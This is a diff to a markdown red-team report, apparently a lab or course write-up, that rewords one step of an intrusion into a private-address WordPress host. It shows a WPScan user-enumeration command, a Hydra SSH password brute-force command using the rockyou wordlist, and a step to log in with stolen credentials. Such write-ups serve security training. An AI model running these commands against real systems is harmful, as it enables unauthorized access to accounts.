@@ -85,7 +85,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - WPScan to enumerate users
         - `wpscan --url 192.168.1.110/wordpress/ --enumerate u`
         - ![WPScan](/Images/WPScan.png)
-      - Use Hydra to crack michael's password or guess password
+      - Use Hydra to crack michael's password or guess weak password
         - `hydra -l michael -P /usr/shar/wordlists/rockyou.txt 192.168.1.110 ssh`
         - ![Hydra](/Images/Hydra.PNG)
       - Use stolen credentials to SSH into michael's account
